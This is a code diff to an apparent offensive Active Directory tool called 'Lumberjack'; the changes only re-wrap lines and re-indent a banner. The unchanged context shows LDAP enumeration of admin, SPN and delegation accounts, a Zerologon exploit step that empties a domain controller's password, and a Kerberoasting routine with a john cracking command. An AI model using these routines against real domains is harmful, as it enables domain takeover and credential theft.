@@ -137,8 +137,7 @@ class EnumerateAD(object):
 			#Search AD Users 
 			else:
 				self.conn.search('%s' % (self.root), search_filter='(objectCategory=person)',
-						 attributes=['sAMAccountName'], 
-						 size_limit=0)
+						 attributes=['sAMAccountName'], size_limit=0)
 				for entry in self.conn.entries:
 					name = entry["sAMAccountName"][0]
 					userObj.append({
@@ -171,7 +170,8 @@ class EnumerateAD(object):
 			console.rule("[bold red]Domain Computers")
 			print('')
 			#Search AD Computers
-			self.conn.search('%s' % (self.root), search_filter='(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))', attributes=['name','dnshostname'], size_limit=0)
+			self.conn.search('%s' % (self.root), search_filter='(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))',
+					 	attributes=['name','dnshostname'], size_limit=0)
 			for entry in self.conn.entries:
 				name = entry["dnshostname"][0]
 				computerObjects.append({
@@ -210,7 +210,8 @@ class EnumerateAD(object):
 			console.rule("[bold red]Domain Groups")
 			print('')
 			#Search AD Group
-			self.conn.search('%s' % (self.root), search_filter='(objectCategory=group)', attributes=['distinguishedName', 'cn'], size_limit=0)
+			self.conn.search('%s' % (self.root), search_filter='(objectCategory=group)',
+					 attributes=['distinguishedName', 'cn'], size_limit=0)
 			for entry in self.conn.entries:
 				name = entry["distinguishedName"][0]
 				groupobj.append({
@@ -242,7 +243,8 @@ class EnumerateAD(object):
 			console.rule("[bold red]Organisational Units")
 			print('')
 			#Search AD Organisational Units
-			self.conn.search('%s' % (self.root), search_filter='(objectclass=organizationalUnit)', attributes=['distinguishedName'], size_limit=0)
+			self.conn.search('%s' % (self.root), search_filter='(objectclass=organizationalUnit)',
+					 attributes=['distinguishedName'], size_limit=0)
 			for entry in self.conn.entries:
 				name = entry["distinguishedName"][0]
 				ouObj.append({
@@ -273,7 +275,8 @@ class EnumerateAD(object):
 			sleep(1)
 			console.rule("[bold red]Admin Users")
 			print('')
-			self.conn.search('%s' % (self.root), '(&(adminCount=1)(objectclass=person))', attributes=['sAMAccountName'], size_limit=0)
+			self.conn.search('%s' % (self.root), '(&(adminCount=1)(objectclass=person))',
+					 attributes=['sAMAccountName'], size_limit=0)
 			for entry in self.conn.entries:
 				name = entry["sAMAccountName"][0]
 	
@@ -307,7 +310,8 @@ class EnumerateAD(object):
 			sleep(1)
 			console.rule("[bold red]Domain Policies")
 			print('')
-			self.conn.search('%s' % (self.root), '(objectClass=domain)', attributes=ALL_ATTRIBUTES, size_limit=0)
+			self.conn.search('%s' % (self.root), '(objectClass=domain)',
+					 attributes=ALL_ATTRIBUTES, size_limit=0)
 			MachineAccountQuota = None
 			for entry in self.conn.entries:
 				name = entry["ms-DS-MachineAccountQuota"][0]
@@ -346,7 +350,9 @@ class EnumerateAD(object):
 			sleep(1)
 			console.rule("[bold red]Unconstrained Delegation")
 			print('')
-			self.conn.search('%s' % (self.root), search_filter='(userAccountControl:1.2.840.113556.1.4.803:=524288)', attributes=["sAMAccountName"],  size_limit=0)
+			self.conn.search('%s' % (self.root),
+					 search_filter='(userAccountControl:1.2.840.113556.1.4.803:=524288)',
+					 attributes=["sAMAccountName"],  size_limit=0)
 			for entry in self.conn.entries:
 				name = entry["sAMAccountName"][0]
 				unconstrained.append({
@@ -379,7 +385,9 @@ class EnumerateAD(object):
 			console.rule("[bold red]SPN Accounts")
 			print('')
 			self.filter = "(&(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512))(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer)))"
-			self.conn.search('%s' % (self.root), search_filter=self.filter, attributes=['name', 'userPrincipalName', 'servicePrincipalName'], size_limit=0)
+			self.conn.search('%s' % (self.root),
+					 search_filter=self.filter, attributes=['name', 'userPrincipalName', 'servicePrincipalName'],
+					 size_limit=0)
 
 			for entry in self.conn.entries:
 				name = entry["userPrincipalName"][0]
@@ -445,7 +453,9 @@ class EnumerateAD(object):
 		else:
 			searchFilter = '(anr={})'.format(fobject)
 		try:	
-			self.conn.search('%s' % (self.root), search_filter=searchFilter, search_scope=SUBTREE, attributes = ALL_ATTRIBUTES, size_limit=0)
+			self.conn.search('%s' % (self.root),
+					 search_filter=searchFilter, search_scope=SUBTREE,
+					 attributes = ALL_ATTRIBUTES, size_limit=0)
 			console.print('[-] Found {0} Objects'.format(len(self.conn.entries)), style = "info")
 			pprint(self.conn.entries) 
 		except LDAPException as e:   
@@ -602,9 +612,11 @@ class ExploitAD(object):
 				result = ExploitAD.try_zerologon(dc_handle, rpc_con, target_computer)
 				if result["ErrorCode"] == 0:
 	
-					console.print("[+] Success: Exploit completed! Domain Controller's account password has been set to an empty string\n", style = "success")
+					console.print("[+] Success: Exploit completed! Domain Controller's account password has been set to an empty string\n",
+						      style = "success")
 				else:
-					console.print("[-] Warning: Non-zero return code, something went wrong. Domain Controller returned: {}\n".format(result["ErrorCode"]), style = "warning")
+					console.print("[-] Warning: Non-zero return code, something went wrong. Domain Controller returned: {}\n".format(result["ErrorCode"]),
+						      style = "warning")
 			else:
 				console.print("[-] Aborted\n", style = "warning")
 				sys.exit(0)
@@ -708,7 +720,8 @@ class ExploitAD(object):
 					for key, value in user_tickets.items():
 						f.write('{0}:{1}\n'.format(key, value))
 				if len(user_tickets.keys()) >= 1:
-					console.print('[+] Success: Received and wrote {0} ticket(s) for Kerberoasting. Run: john --format=krb5tgs --wordlist=<list> {1}-spn-tickets\n'.format(len(user_tickets.keys()), domain), style = 'success')	
+					console.print('[+] Success: Received and wrote {0} ticket(s) for Kerberoasting. Run: john --format=krb5tgs --wordlist=<list> {1}-spn-tickets\n'.format(len(user_tickets.keys()),
+					domain), style = 'success')	
 			else:
 				console.print('[-] Received {0} ticket(s) for Kerberoasting\n'.format(len(user_tickets.keys())), style = 'warning')
 			
@@ -772,7 +785,8 @@ class ExploitAD(object):
 				response = sendReceive(msg, Domain, dc_ip)
 			except KerberosError as e:
 				if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
-					supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value), int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
+					supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
+							    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
 					seq_set_iter(requestBody, 'etype', supportedCiphers)
 					msg = encoder.encode(asReq)
 					response = sendReceive(msg, Domain, dc_ip)
@@ -821,12 +835,12 @@ def parse_credentials(credentials):
 def main():
 
 	parser = argparse.ArgumentParser(prog='Lumberjack', add_help=False, formatter_class=argparse.RawDescriptionHelpFormatter, description=textwrap.dedent('''
-			 	 __                    __              _            __
-				/ /   __  ______ ___  / /_  ___  _____(_)___ ______/ /__
+			 __                    __              _            __
+			/ /   __  ______ ___  / /_  ___  _____(_)___ ______/ /__
 		       / /   / / / / __ `__ \/ __ \/ _ \/ ___/ / __ `/ ___/ //_/
 		      / /___/ /_/ / / / / / / /_/ /  __/ /  / / /_/ / /__/  ,<
 		     /_____/\__,_/_/ /_/ /_/_.___/\___/_/__/ /\__,_/\___/_/|_|
-												/___/
+							/___/
 	                       __.                                   
 	              ________/o |)
 	             {_______{_rs|
